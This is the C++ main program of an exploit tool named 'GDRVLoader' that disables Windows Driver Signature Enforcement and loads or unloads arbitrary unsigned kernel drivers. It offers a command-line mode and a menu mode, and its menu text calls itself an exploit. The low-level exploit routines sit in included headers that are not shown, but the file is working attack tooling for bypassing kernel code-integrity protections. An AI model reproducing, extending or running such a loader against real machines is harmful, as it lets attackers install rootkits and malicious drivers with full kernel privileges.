#include "global.h"
#include "exploit/api.h"
#include "exploit/swind2.h"
#include <conio.h>
#include <cwctype>
#include <iostream>
#include <string>

NTSTATUS RunAutomaticMode(const wchar_t* driverPath, const wchar_t* command)
{
    NTSTATUS status = STATUS_SUCCESS;

    if (_wcsicmp(command, L"load") == 0)
    {
        wprintf(L"[Auto] Loading driver: %ls\n", driverPath);
        status = WindLoadDriver(PWCHAR(driverPath), false);
        if (!NT_SUCCESS(status))
        {
            printf("FATAL: %08lX Failed to load the driver %ls\n", status, driverPath);
        } else
        {
            printf("Successfully loaded the driver %ls\n", driverPath);
        }
    }
    else if (_wcsicmp(command, L"unload") == 0)
    {
        wprintf(L"[Auto] Unloading driver: %ls\n", driverPath);
        status = WindUnloadDriver(PWCHAR(driverPath));
        if (!NT_SUCCESS(status))
        {
            printf("FATAL: %08lX Failed to unload the driver %ls\n", status, driverPath);
        } else
        {
            printf("Successfully unloaded the driver %ls\n", driverPath);
        }
    }
    else if (_wcsicmp(command, L"dse") == 0)
    {
        wprintf(L"[Auto] Disabling DSE...\n");
        if (!DSEDisable())
        {
            printf("Failed to disable DSE\n");
            return STATUS_FAIL_FAST_EXCEPTION;
        }

        printf("Press any key to re-enable DSE...\n");
        _getch();

        wprintf(L"[Auto] Re-enabling DSE...\n");
        if (!DSEEnable())
        {
            printf("Failed to re-enable DSE\n");
            return STATUS_FAIL_FAST_EXCEPTION;
        }

        printf("DSE re-enabled successfully\n");
    }
    else if (_wcsicmp(command, L"test") == 0)
    {
        printf("CodeIntegrity: %s\n", IsCiEnabled() > 0 ? "Enabled" : "Disabled");
        printf("Loader Version: %lu\n", GetLoaderVersion());

        ULONG ciOptions = 0;
        status = ReadCIOptions(&ciOptions);
        if (!NT_SUCCESS(status))
        {
            printf("FATAL: %08lX Failed to read CI options\n", status);
            return status;
        }
        printf("CI Options Value: %lu (0x%lX)\n", ciOptions, ciOptions);
        printf("CodeIntegrity is now: %s\n", IsCiEnabled() > 0 ? "Enabled" : "Disabled");
    }
    else
    {
        wprintf(L"Unknown command: %ls\n", command);
        wprintf(L"Valid commands: load, unload, dse\n");
        return STATUS_INVALID_PARAMETER;
    }

    return status;
}

void ShowMenu()
{
    printf("\n=== GDRVLoader Manual Mode ===\n");
    printf("1. Print DSE/CI state (always start with that option to ensure exploit works)\n");
    printf("2. Disable + Re-enable DSE\n");
    printf("3. Load a driver\n");
    printf("4. Unload a driver\n");
    printf("0. Exit\n");
    printf("Select an option: ");
}

std::wstring ReadDriverPathInput(const wchar_t* prompt)
{
    std::wstring input;
    std::wcout << prompt;
    std::getline(std::wcin, input);

    // Trim leading/trailing spaces and quotes
    auto is_space_or_quote = [](wchar_t ch)
    {
        return std::iswspace(ch) || ch == L'"';
    };

    // Left trim
    input.erase(input.begin(), std::find_if(input.begin(), input.end(),
                                            [&](wchar_t ch) { return !is_space_or_quote(ch); }));

    // Right trim
    input.erase(std::find_if(input.rbegin(), input.rend(),
                             [&](wchar_t ch) { return !is_space_or_quote(ch); }).base(), input.end());

    return input;
}

void RunManualMode()
{
    while (true)
    {
        ShowMenu();
        int choice = _getch() - '0';
        printf("%d\n", choice);

        std::wstring driverPath;
        const wchar_t* command = nullptr;

        switch (choice)
        {
        case 1:
            command = L"test";
            driverPath.clear();
            break;
        case 2:
            command = L"dse";
            driverPath.clear();
            break;
        case 3:
            driverPath = ReadDriverPathInput(L"Enter full path to driver to load: ");
            command = L"load";
            break;

        case 4:
            driverPath = ReadDriverPathInput(L"Enter full path to driver to unload: ");
            command = L"unload";
            break;
        case 0:
            return;

        default:
            printf("Invalid option\n");
            continue;
        }

        NTSTATUS status = RunAutomaticMode(driverPath.c_str(), command);
        if (!NT_SUCCESS(status))
        {
            printf("Command failed: 0x%08lX\n", status);
        }
    }
}

int wmain(int argc, wchar_t** argv)
{
    if (argc >= 2)
    {
        const wchar_t* driverPath = argv[1];
        const wchar_t* command = (argc >= 3) ? argv[2] : L"load";
        NTSTATUS status = RunAutomaticMode(driverPath, command);
        if (!NT_SUCCESS(status))
        {
            printf("Error: 0x%08lX\n", status);
        }
        return status;
    }
    else
    {
        RunManualMode();
        return 0;
    }
}
